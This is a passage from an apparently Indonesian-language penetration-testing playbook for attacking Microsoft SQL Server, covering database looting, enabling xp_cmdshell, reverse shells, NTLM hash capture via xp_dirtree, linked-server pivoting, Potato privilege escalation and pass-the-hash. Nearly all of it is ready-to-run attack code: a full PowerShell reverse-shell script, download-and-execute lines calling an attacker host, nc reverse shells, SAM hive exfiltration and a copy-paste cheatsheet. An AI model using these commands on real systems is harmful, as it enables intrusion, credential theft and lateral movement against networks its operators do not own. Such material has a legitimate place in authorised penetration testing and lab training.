➡️ `portal_db`, `corp_hr` = database aplikasi! Target looting.

SQL

```
-- Query 5: List tabel di database spesifik
USE portal_db;
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
```

**OUTPUT BERHASIL ✅:**

text

```
table_name
-----------
users
admin_accounts
employees
site_config
```

➡️ Ada tabel `users` dan `admin_accounts`! Dump sekarang.

SQL

```
-- Dump users
SELECT TOP 20 * FROM users;
SELECT TOP 20 username, password, email FROM users;
```

---

### Langkah 3.4 — Recon Linked Servers & xp_cmdshell Status

SQL

```
-- Query 6: Cek Linked Servers (untuk pivot ke server DB lain)
EXEC sp_linkedservers;
SELECT srvname, srvproduct, providername, datasrc FROM master.dbo.sysservers;
```

**OUTPUT BERHASIL ✅ — Ada Linked Server:**

text

```
srvname        srvproduct   providername   datasrc
-----------    ----------   ------------   -----------
REMOTE-CORE    SQL Server   SQLNCLI        192.168.1.50
```

➡️ **Ada Linked Server!** Simpan info ini. Akan berguna di **Fase 6 (Linked Server Attack)**

SQL

```
-- Query 7: Cek semua SQL logins dan hak akses mereka
SELECT name, is_srvrolemember('sysadmin') as is_sysadmin 
FROM sys.server_principals 
WHERE type IN ('S', 'U');
```

**OUTPUT BERHASIL ✅:**

text

```
name           is_sysadmin
-----------    -----------
sa             1
db_admin       0
corp\sql_svc   1
guest          0
```

➡️ `corp\sql_svc` adalah sysadmin! → Jika bisa impersonasi atau PTH, langsung jadi sysadmin.

SQL

```
-- Query 8: Status xp_cmdshell saat ini
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
```

**OUTPUT BERHASIL ✅ — xp_cmdshell sudah aktif:**

text

```
name           minimum  maximum  config_value  run_value
-----------    -------  -------  ------------  ---------
xp_cmdshell    0        1        1             1
```

➡️ `run_value = 1` = sudah aktif! Langsung eksekusi tanpa rekonfigurasi.

**OUTPUT ✅ — xp_cmdshell nonaktif (default):**

text

```
name           minimum  maximum  config_value  run_value
-----------    -------  -------  ------------  ---------
xp_cmdshell    0        1        0             0
```

➡️ Perlu diaktifkan dulu. Lanjut ke **Fase 4.1**

---

## ═══════════════════════════════════════

## FASE 4: xp_cmdshell — OS COMMAND EXECUTION

## ═══════════════════════════════════════

> **Prasyarat:** `IS_SRVROLEMEMBER('sysadmin') = 1`

### Langkah 4.1 — Aktifkan xp_cmdshell

SQL

```
-- Method 1: Manual via SQL queries
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**OUTPUT BERHASIL ✅:**

text

```
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Bash

```
# Method 2: Di impacket-mssqlclient, ada shortcut built-in!
# Di dalam prompt SQL>:
SQL (sa  guest@master)> enable_xp_cmdshell
```

**OUTPUT BERHASIL ✅ — impacket shortcut:**

text

```
[*] INFO(SQL01): Line 185: Configuration option 'show advanced options' changed from 0 to 1.
[*] INFO(SQL01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1.
```

**OUTPUT GAGAL ❌ — Permission denied:**

text

```
[-] ERROR: RECONFIGURE statement failed. Only members of the sysadmin role can run RECONFIGURE.
```

➡️ Kamu bukan sysadmin. Cek impersonation:

SQL

```
-- Cek siapa yang bisa diimpersonasi
SELECT DISTINCT b.name FROM sys.server_permissions a 
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE';

-- Jika ada 'sa' atau sysadmin:
EXECUTE AS LOGIN = 'sa';
-- Coba lagi enable xp_cmdshell
```

➡️ Jika tidak bisa impersonasi → Skip ke **Fase 5 (NTLM Coercion)**

---

### Langkah 4.2 — Test xp_cmdshell Execution

SQL

```
-- Test 1: Siapa kita di OS?
EXEC xp_cmdshell 'whoami';
```

**OUTPUT BERHASIL ✅:**

text

```
output
----------------------------------------------------
nt service\mssqlserver
NULL
```

SQL

```
-- Test 2: Cek privilege Windows (KRITIS! Cari SeImpersonatePrivilege)
EXEC xp_cmdshell 'whoami /priv';
```

**OUTPUT BERHASIL ✅ — SeImpersonatePrivilege ada:**

text

```
output
----------------------------------------------------
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                   State
============================= ============================= =========
SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas...       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking      Enabled
SeImpersonatePrivilege        Impersonate a client after... Enabled   ← KRITIS!
SeCreateGlobalPrivilege       Create global objects         Enabled
```

➡️ `SeImpersonatePrivilege = Enabled` → **Bisa escalate ke SYSTEM via GodPotato!** Ke **Fase 7**

SQL

```
-- Test 3: Enumerasi lebih lanjut
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net localgroup administrators';
```

**OUTPUT GAGAL ❌ — xp_cmdshell enabled tapi tidak ada output:**

text

```
output
----------------------------------------------------
NULL
```

➡️ Command mungkin gagal di Windows. Debug:

SQL

```
-- Alihkan output ke file dulu
EXEC xp_cmdshell 'whoami > C:\Windows\Temp\out.txt';
EXEC xp_cmdshell 'type C:\Windows\Temp\out.txt';
-- Jika masih NULL → mungkin AV/EDR memblokir
-- Coba command yang lebih innocuous:
EXEC xp_cmdshell 'echo test';
EXEC xp_cmdshell 'dir C:\';
```

---

### Langkah 4.3 — Spawn Reverse Shell via xp_cmdshell

Bash

```
# Di Parrot OS, buat file shell.ps1 dulu:
cat > ~/mssql_loot/shells/shell.ps1 << 'EOF'
$c=New-Object System.Net.Sockets.TCPClient("LHOST_PLACEHOLDER",LPORT_PLACEHOLDER);
$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
    $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
    $sb=(iex $d 2>&1|Out-String);
    $sb2=$sb+"PS "+(pwd).Path+"> ";
    $sbt=([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);$s.Flush()
}
$c.Close()
EOF

# Replace placeholder dengan IP dan port kamu
sed -i "s/LHOST_PLACEHOLDER/$LHOST/g; s/LPORT_PLACEHOLDER/$LPORT/g" ~/mssql_loot/shells/shell.ps1

# Host file via Python HTTP server
cd ~/mssql_loot/shells/
python3 -m http.server 80 &

# Setup listener di terminal lain
nc -lvnp $LPORT
```

SQL

```
-- Di prompt MSSQL — Download dan execute shell.ps1
-- Method 1: IEX DownloadString (paling bersih)
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/shell.ps1'')"';

-- Method 2: Jika Method 1 diblokir AV, coba download nc.exe dulu
EXEC xp_cmdshell 'certutil.exe -urlcache -split -f "http://10.10.14.5/nc.exe" C:\Windows\Temp\nc.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.5 9001';

-- Method 3: PowerShell Base64 one-liner (jika tidak bisa download file)
-- Generate base64 di Parrot OS dulu:
-- python3 -c "import base64; cmd='$c=New-Object...'; print(base64.b64encode(cmd.encode(\"utf-16-le\")).decode())"
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc BASE64_HERE';
```

**OUTPUT BERHASIL ✅ — Reverse shell diterima:**

text

```
Listening on 0.0.0.0 9001
Connection received on 10.10.11.200 49832
PS C:\Windows\system32>whoami
nt service\mssqlserver
PS C:\Windows\system32> whoami /priv
# Lihat SeImpersonatePrivilege → ke Fase 7 (GodPotato)
```

**OUTPUT GAGAL ❌ — PowerShell diblokir (AV/EDR):**

text

```
At line:1 char:1
+ IEX(...
+ CategoryInfo          : SecurityError: (:) [], ...
```

➡️ PowerShell execution policy atau AV memblokir:

SQL

```
-- Bypass ExecutionPolicy
EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -c "IEX(...)"';

-- Atau gunakan mshta (Microsoft HTML Application)
EXEC xp_cmdshell 'mshta http://10.10.14.5/shell.hta';

-- Atau gunakan certutil + batch script
EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.5/shell.bat C:\Windows\Temp\s.bat';
EXEC xp_cmdshell 'C:\Windows\Temp\s.bat';
```

---

## ═══════════════════════════════════════

## FASE 5: NTLM COERCION via xp_dirtree

## ═══════════════════════════════════════

> **Prasyarat:** Bisa login ke MSSQL tapi BUKAN sysadmin (role public saja sudah cukup!)  
> **Tujuan:** Paksa MSSQL server melakukan autentikasi NTLM ke mesin kita → capture hash → crack

### Langkah 5.1 — Setup Responder

Bash

```
# Terminal 1 di Parrot OS — Jalankan Responder DULU sebelum trigger coercion
sudo responder -I tun0 -v

# Tunggu sampai Responder siap:
# [+] Listening for events...
```

---

### Langkah 5.2 — Trigger NTLM Coercion

SQL

```
-- Di prompt MSSQL (Terminal 2):

-- Method 1: xp_dirtree — paling reliable
EXEC master..xp_dirtree '\\10.10.14.5\pwn';

-- Method 2: xp_fileexist — alternatif
EXEC master..xp_fileexist '\\10.10.14.5\pwn\test.txt';

-- Method 3: xp_subdirs
EXEC master..xp_subdirs '\\10.10.14.5\pwn';
```

**OUTPUT BERHASIL ✅ — Hash tertangkap di Responder:**

text

```
[SMB] NTLMv2-SSP Client   : 10.10.11.200
[SMB] NTLMv2-SSP Username : SQL01\svc_mssql
[SMB] NTLMv2-SSP Hash     : svc_mssql::CORP:5c2a4f6e9b1d3a07:44a70b1a...:01010000000000...
```

➡️ **HASH TERTANGKAP!** Simpan dan crack:

Bash

```
# Simpan hash ke file
echo "svc_mssql::CORP:5c2a4f6e9b1d3a07:44a70b1a...:01010000000000..." \
    > ~/mssql_loot/hashes/ntlmv2_mssql.txt

# Crack dengan hashcat (mode 5600 = NetNTLMv2)
hashcat -m 5600 ~/mssql_loot/hashes/ntlmv2_mssql.txt \
    /usr/share/wordlists/rockyou.txt \
    -O -o ~/mssql_loot/hashes/cracked_ntlm.txt

# Lihat hasil
cat ~/mssql_loot/hashes/cracked_ntlm.txt
```

**OUTPUT BERHASIL ✅ — Hash berhasil di-crack:**

text

```
svc_mssql::CORP:...:L33tP@ssw0rd!
```

➡️ Password `L33tP@ssw0rd!` untuk user `svc_mssql`! Test ke semua service:

Bash

```
export CRACKED_USER="svc_mssql"
export CRACKED_PASS="L33tP@ssw0rd!"
echo "$CRACKED_USER:$CRACKED_PASS" >> ~/mssql_loot/creds/found_creds.txt

# Test credential reuse
nxc smb $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS"
nxc winrm $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS"
ssh "$CRACKED_USER@$TARGET"
```

**OUTPUT GAGAL ❌ — Hash tidak muncul di Responder:**

text

```
# Tidak ada output di Responder
```

➡️ MSSQL mungkin tidak bisa reach keluar ke IP kita:

Bash

```
# Cek firewall outbound
# Di prompt MSSQL:
# EXEC xp_cmdshell 'ping 10.10.14.5';

# Jika ping tidak sampai → firewall outbound ketat
# Alternatif: gunakan Inveigh (Responder versi Windows) dari dalam shell
# Atau fokus ke NTLM relay jika ada target lain
```

**OUTPUT GAGAL ❌ — hashcat tidak bisa crack:**  
➡️ Coba rules yang lebih agresif:

Bash

```
hashcat -m 5600 ~/mssql_loot/hashes/ntlmv2_mssql.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -O

# Atau wordlist lebih besar
hashcat -m 5600 ~/mssql_loot/hashes/ntlmv2_mssql.txt \
    /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

# Google: "NetNTLMv2 MSSQL hashcat" untuk tips tambahan
```

---

## ═══════════════════════════════════════

## FASE 6: LINKED SERVER ATTACK (LATERAL MOVEMENT)

## ═══════════════════════════════════════

> **Prasyarat:** Ditemukan Linked Server di **Langkah 3.4**  
> **Tujuan:** Pivot dari database ini ke database server lain di jaringan internal

### Langkah 6.1 — Enumerate Linked Servers

SQL

```
-- List semua linked servers
SELECT srvname, srvproduct, providername, datasrc 
FROM master.dbo.sysservers
WHERE srvid != 0;  -- exclude server lokal
```

**OUTPUT BERHASIL ✅:**

text

```
srvname        srvproduct    providername    datasrc
-----------    ----------    ------------    -----------
REMOTE-DB-02   SQL Server    SQLNCLI         192.168.1.50
CORE-FINANCE   SQL Server    SQLNCLI         10.10.10.5
```

---

### Langkah 6.2 — Cek Akses ke Linked Server

SQL

```
-- Cek versi remote server (test koneksi)
SELECT * FROM OPENQUERY("REMOTE-DB-02", 'SELECT @@version');

-- Cek apakah kita sysadmin di remote server
SELECT * FROM OPENQUERY("REMOTE-DB-02", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```

**OUTPUT BERHASIL ✅ — Sysadmin di remote:**

text

```
(No column name)
-----------
          1
```

➡️ **SYSADMIN di server remote!** Enable xp_cmdshell di sana:

SQL

```
-- Enable xp_cmdshell di Linked Server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT "REMOTE-DB-02";
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT "REMOTE-DB-02";

-- Eksekusi command di remote server!
EXEC ('EXEC xp_cmdshell ''whoami''') AT "REMOTE-DB-02";
```

**OUTPUT BERHASIL ✅ — RCE di remote server:**

text

```
output
----------------------------------------------------
nt authority\system
```

➡️ **SYSTEM di server remote!** Spawn reverse shell:

SQL

```
-- Spawn reverse shell di remote server
-- (pastikan listener sudah jalan di port berbeda)
EXEC ('EXEC xp_cmdshell ''powershell -c "IEX(New-Object Net.WebClient).DownloadString(''''http://10.10.14.5/shell2.ps1'''')"''') AT "REMOTE-DB-02";
```

**OUTPUT GAGAL ❌ — OPENQUERY error:**

text

```
OLE DB provider "SQLNCLI" for linked server "REMOTE-DB-02" returned message "Login timeout expired".
```

➡️ Remote server tidak accessible atau credentials linked server tidak valid. Coba:

SQL

```
-- Cek credentials yang dipakai untuk linked server
EXEC sp_helplinkedsrvlogin;
```

---

## ═══════════════════════════════════════

## FASE 7: PRIVILEGE ESCALATION via SeImpersonatePrivilege

## ═══════════════════════════════════════

> **Prasyarat:** Dapat shell dari xp_cmdshell dengan `SeImpersonatePrivilege = Enabled`  
> **Tujuan:** Escalate dari `nt service\mssqlserver` ke `NT AUTHORITY\SYSTEM`

### Langkah 7.1 — Verifikasi SeImpersonatePrivilege

cmd

```
:: Di Windows shell yang sudah didapat dari xp_cmdshell:
whoami /priv
```

**OUTPUT BERHASIL ✅ — SeImpersonatePrivilege ada:**

text

```
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

➡️ **BISA POTATO ATTACK!** Lanjut ke Langkah 7.2

**OUTPUT GAGAL ❌ — SeImpersonatePrivilege tidak ada:**

text

```
(tidak ada baris SeImpersonatePrivilege)
```

➡️ Service account ini tidak punya privilege impersonation. Coba:

- Cek privilege lain yang bisa dieksploitasi
- Lanjut ke `[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)`

---

### Langkah 7.2 — Upload GodPotato (atau tool Potato lain)

Bash

```
# Di Parrot OS:

# Download GodPotato (cek GitHub untuk versi terbaru)
# https://github.com/BeichenDream/GodPotato/releases
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe \
    -O ~/mssql_loot/shells/GodPotato-NET4.exe

# Juga siapkan nc.exe
cp /usr/share/windows-binaries/nc.exe ~/mssql_loot/shells/ 2>/dev/null || \
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O ~/mssql_loot/shells/nc.exe

# Host via HTTP server
cd ~/mssql_loot/shells/
python3 -m http.server 80 &
```

cmd

```
:: Di Windows shell (dari xp_cmdshell reverse shell):
:: Download GodPotato ke target
certutil -urlcache -split -f "http://10.10.14.5/GodPotato-NET4.exe" C:\Windows\Temp\gp.exe

:: Download nc.exe
certutil -urlcache -split -f "http://10.10.14.5/nc.exe" C:\Windows\Temp\nc.exe
```

**OUTPUT BERHASIL ✅ — Download berhasil:**

text

```
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

**OUTPUT GAGAL ❌ — certutil diblokir:**

text

```
CertUtil: -URLCache command FAILED
```

➡️ Coba alternatif download:

cmd

```
:: Method 2: PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/GodPotato-NET4.exe','C:\Windows\Temp\gp.exe')"

:: Method 3: bitsadmin
bitsadmin /transfer myJob http://10.10.14.5/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
```

---

### Langkah 7.3 — Execute GodPotato → SYSTEM Shell

Bash

```
# Di Parrot OS — setup listener di port berbeda untuk SYSTEM shell
nc -lvnp 9002
```

cmd

```
:: Di Windows shell:
:: Eksekusi GodPotato untuk spawn SYSTEM shell ke listener
C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.5 9002"
```

**OUTPUT BERHASIL ✅ — SYSTEM shell diterima:**

text

```
listening on [any] 9002 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 49900
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

➡️ **NT AUTHORITY\SYSTEM!** Langkah selanjutnya:

cmd

```
:: Dump credentials untuk lateral movement
reg save HKLM\SAM C:\Windows\Temp\sam.bak
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak

:: Transfer file ke Parrot OS
:: (host SMB server di Parrot: impacket-smbserver share . -smb2support)
copy C:\Windows\Temp\sam.bak \\10.10.14.5\share\sam.bak
copy C:\Windows\Temp\system.bak \\10.10.14.5\share\system.bak
```

Bash

```
# Di Parrot OS — extract hashes dari SAM
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

**OUTPUT GAGAL ❌ — GodPotato tidak berhasil:**

text

```
[!] GodPotato Failed
```

➡️ Coba tools Potato lain:

cmd

```
:: PrintSpoofer (Windows Server 2019, Windows 10)
certutil -f -urlcache -split "http://10.10.14.5/PrintSpoofer64.exe" C:\Windows\Temp\ps.exe
C:\Windows\Temp\ps.exe -i -c "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.5 9002"

:: JuicyPotatoNG (Server 2016, Windows 10)
certutil -f -urlcache -split "http://10.10.14.5/JuicyPotatoNG.exe" C:\Windows\Temp\jp.exe
C:\Windows\Temp\jp.exe -t * -p "C:\Windows\Temp\nc.exe" -a "-e cmd.exe 10.10.14.5 9002"
```

---

## ═══════════════════════════════════════

## FASE 8: HASH EXTRACTION & CRACKING

## ═══════════════════════════════════════

> **Tujuan:** Extract dan crack hash MSSQL logins untuk credential reuse

### Langkah 8.1 — Dump SQL Login Hashes

SQL

```
-- Dump hash semua SQL logins (butuh sysadmin)
SELECT name, password_hash FROM master.sys.sql_logins;
```

**OUTPUT BERHASIL ✅:**

text

```
name      password_hash
-------   ----------------------------------------------------------------
sa        0x02005A32843EA94B917F3395C621903...E81B89C819F3795C62 (MSSQL 2012+)
db_admin  0x01004B2192FA7B4E3BDA24C4E1C05...A81C77D912E (MSSQL 2005/2008)
```

Bash

```
# Simpan hash ke file
# Format: gunakan nilai hex setelah 0x0200... atau 0x0100...

# Crack dengan hashcat:
# MSSQL 2000       → mode 131
# MSSQL 2005/2008  → mode 132
# MSSQL 2012/2014+ → mode 1731 (paling umum)

# Extract hex value saja
echo "0x02005A32843EA94B917F..." > ~/mssql_loot/hashes/mssql_sa.hash

hashcat -m 1731 ~/mssql_loot/hashes/mssql_sa.hash \
    /usr/share/wordlists/rockyou.txt \
    -O -o ~/mssql_loot/hashes/cracked_mssql.txt

cat ~/mssql_loot/hashes/cracked_mssql.txt
```

**OUTPUT BERHASIL ✅ — Berhasil crack:**

text

```
0x02005A...:AdminPassword2024!
```

---

### Langkah 8.2 — Dump via Nmap (Dari Luar, Tanpa Manual Query)

Bash

```
# Dump hashes langsung via Nmap NSE (lebih cepat, tidak perlu masuk manual)
nmap -p 1433 --script ms-sql-dump-hashes \
    --script-args "mssql.username=$DB_USER,mssql.password=$DB_PASS" \
    $TARGET

# Simpan output
nmap -p 1433 --script ms-sql-dump-hashes \
    --script-args "mssql.username=$DB_USER,mssql.password=$DB_PASS" \
    $TARGET -oN ~/mssql_loot/hashes/nmap_hash_dump.txt
```

---

## ═══════════════════════════════════════

## FASE 9: POST-EXPLOITATION & LATERAL MOVEMENT

## ═══════════════════════════════════════

### Langkah 9.1 — Kumpulkan Info Setelah Dapat SYSTEM Shell

cmd

```
:: Di Windows SYSTEM shell:

:: 1. Network info untuk pivot
ipconfig /all
arp -a
net view /domain
route print

:: 2. Dump credentials dari memory (butuh mimikatz atau secretsdump)
:: Option A: Dari Parrot OS dengan impacket
:: impacket-secretsdump "Administrator:Password123!@$TARGET"

:: 3. Cek akun lokal dan grup
net user
net localgroup administrators
net user administrator

:: 4. Cek service dan proses berjalan
tasklist /v
netstat -ano
sc query
```

---

### Langkah 9.2 — Cross-Service Credential Testing Chart

text

```
MSSQL Credentials / NTLM Hash Found
           │
           ├─ ─→ Port 22    (SSH)       → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
           ├──→ Port 21    (FTP)       → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
           ├──→ Port 445   (SMB)       → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
           ├──→ Port 3389  (RDP)       → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
           ├──→ Port 5985  (WinRM)     → evil-winrm
           ├──→ Port 3306  (MySQL)     → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
           ├──→ Port 5432  (PostgreSQL) → <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
           ├──→ AD Environment         → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
           └──→ Linked Servers         → Pivot ke DB server lain (Fase 6)
```

Bash

```
# Test credential reuse ke semua service:
nxc smb $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS"
nxc winrm $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS"
nxc ssh $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS"

# Pass-The-Hash jika punya NTLM hash dari secretsdump:
nxc smb $TARGET -u "Administrator" -H "$NTLM_HASH" --shares
nxc winrm $TARGET -u "Administrator" -H "$NTLM_HASH"
evil-winrm -i $TARGET -u "Administrator" -H "$NTLM_HASH"

# Kerberoasting jika environment AD:
impacket-GetUserSPNs "$DOMAIN/$CRACKED_USER:$CRACKED_PASS" \
    -dc-ip $TARGET -request \
    -outputfile ~/mssql_loot/hashes/kerberoast.txt
# → ke <a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`Login failed for user 'sa'. Reason: The account is disabled`|Windows Auth Only mode|Gunakan `-windows-auth` dengan domain credentials|
|`SQL Server blocked access to procedure 'sys.xp_cmdshell'`|xp_cmdshell dinonaktifkan|`enable_xp_cmdshell` di impacket atau `sp_configure` manual|
|`Connection timeout port 1433`|Named Instance atau firewall|Scan UDP 1434, cari port dinamis, gunakan `-port`|
|`The execute permission was denied on xp_cmdshell`|Bukan sysadmin|Cek impersonation, beralih ke Fase 5 (xp_dirtree)|
|`RECONFIGURE failed, only sysadmin`|Bukan sysadmin|Cek `EXECUTE AS LOGIN = 'sa'`|
|`Login failed. Not associated with trusted SQL connection`|Windows Auth format salah|Tambahkan flag `-windows-auth` eksplisit|
|`SSL handshake failed / TLS error`|SSL usang di server lama|Coba tanpa enkripsi strict atau upgrade impacket|
|`xp_cmdshell returns NULL`|Command gagal atau AV blokir|Test `echo test` dulu, redirect ke file, cek AV|
|`GodPotato failed`|OS tidak support|Coba PrintSpoofer atau JuicyPotatoNG|
|`certutil diblokir`|AppLocker atau AV|Gunakan `bitsadmin` atau PowerShell WebClient|
|`OPENQUERY linked server timeout`|Remote tidak accessible|`EXEC sp_helplinkedsrvlogin` cek credentials|
|Quote escape error di OPENQUERY|T-SQL escape salah|Gunakan `''double single quotes''` di dalam string|
|`hydra mssql hang`|TDS protocol strict|Kurangi thread: `-t 2` bukan `-t 4`|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Port 1433 Open
│
├─ FASE 0: Fingerprint
│   ├─ nmap ms-sql-info → Versi, Instance name, Domain
│   └─ nmap ms-sql-empty-password → [KOSONG?] → LANGSUNG FASE 2!
│
├─ FASE 1: Credential Discovery
│   ├─ web.config / appsettings.json → [Ada creds?] → FASE 2
│   ├─ SMB loot files grep → [Ada creds?] → FASE 2
│   ├─ Credential reuse dari service lain → [Valid?] → FASE 2
│   └─ Brute force hydra (t=4) → [Crack?] → FASE 2
│
├─ FASE 2: Login MSSQL
│   ├─ [Berhasil] → FASE 3
│   └─ [Gagal] → Windows Auth / PTH / SSH Tunnel
│
├─ FASE 3: Reconnaissance (8 Query Wajib)
│   ├─ IS_SRVROLEMEMBER('sysadmin') = 1 → FASE 4 (xp_cmdshell)
│   ├─ IS_SRVROLEMEMBER('sysadmin') = 0 → Cek impersonation
│   │   ├─ [Bisa impersonasi sa] → EXECUTE AS LOGIN → FASE 4
│   │   └─ [Tidak bisa] → FASE 5 (NTLM Coercion)
│   └─ Linked Servers ditemukan → FASE 6 (Lateral Movement)
│
├─ FASE 4: xp_cmdshell RCE
│   ├─ Enable xp_cmdshell → Exec whoami/priv
│   ├─ SeImpersonatePrivilege = Enabled → FASE 7 (GodPotato → SYSTEM)
│   └─ Spawn Reverse Shell → Post-exploitation
│
├─ FASE 5: NTLM Coercion (Jika Bukan Sysadmin)
│   └─ xp_dirtree → Responder → NetNTLMv2 → Hashcat 5600 → Creds → Reuse
│
├─ FASE 6: Linked Server Attack
│   └─ OPENQUERY → Remote sysadmin → xp_cmdshell di remote → SYSTEM remote
│
├─ FASE 7: Privilege Escalation
│   └─ GodPotato / PrintSpoofer → NT AUTHORITY\SYSTEM
│
└─ FASE 8-9: Hash Extraction & Lateral Movement
    └─ secretsdump → NTLM hashes → PTH ke SMB/WinRM/RDP
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="9001"
export DB_USER="sa"; export DB_PASS=""; export DOMAIN="CORP"
export NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASHHERE"
mkdir -p ~/mssql_loot/{files,creds,hashes,shells}

# === DETEKSI ===
nmap -sV -p 1433 --script "ms-sql-*" $TARGET -oN nmap_mssql.txt
nmap -sU -p 1434 --script ms-sql-info $TARGET     # Named instance discovery

# === KONEKSI ===
impacket-mssqlclient "$DB_USER:$DB_PASS"@$TARGET -db master      # SQL Auth
impacket-mssqlclient sa@$TARGET -no-pass                          # Blank password
impacket-mssqlclient "$DOMAIN/$DB_USER:$DB_PASS"@$TARGET -windows-auth  # Windows Auth
impacket-mssqlclient "Administrator@$TARGET" -hashes ":$NTLM_HASH" -windows-auth  # PTH
nxc mssql $TARGET -u "$DB_USER" -p "$DB_PASS"                    # NetExec validate

# === RECON QUERIES (di prompt SQL>) ===
# SELECT @@version;                                           # Versi OS + SQL
# SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');  # Cek privilege
# SELECT name FROM master.dbo.sysdatabases;                  # List DBs
# SELECT * FROM sys.servers;                                  # Linked servers
# SELECT name, password_hash FROM master.sys.sql_logins;     # Dump hashes

# === XP_CMDSHELL ===
# enable_xp_cmdshell    (shortcut impacket)
# EXEC xp_cmdshell 'whoami /priv';
# EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://LHOST/shell.ps1'')"';

# === NTLM COERCION ===
# sudo responder -I tun0 -v   (Terminal 1)
# EXEC master..xp_dirtree '\\LHOST\pwn';   (Terminal 2, di prompt SQL)
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt -O

# === LINKED SERVER ===
# EXEC ('EXEC xp_cmdshell ''whoami''') AT "REMOTE-SERVER";

# === HASH CRACKING ===
hashcat -m 131 hash.txt rockyou.txt    # MSSQL 2000
hashcat -m 132 hash.txt rockyou.txt    # MSSQL 2005/2008
hashcat -m 1731 hash.txt rockyou.txt   # MSSQL 2012/2014+
hashcat -m 5600 hash.txt rockyou.txt   # NetNTLMv2 (dari Responder)

# === POTATO ATTACK (Dari Windows Shell) ===
# certutil -f -urlcache -split "http://LHOST/GodPotato-NET4.exe" C:\Windows\Temp\gp.exe
# C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe LHOST 9002"

# === POST EXPLOIT ===
impacket-secretsdump "$DB_USER:$DB_PASS@$TARGET"   # Dump all hashes
nxc winrm $TARGET -u "Administrator" -H "$NTLM_HASH"   # PTH ke WinRM
evil-winrm -i $TARGET -u "Administrator" -H "$NTLM_HASH"  # Shell via WinRM
```

---

> **➡️ NEXT:** Setelah MSSQL selesai:
> 
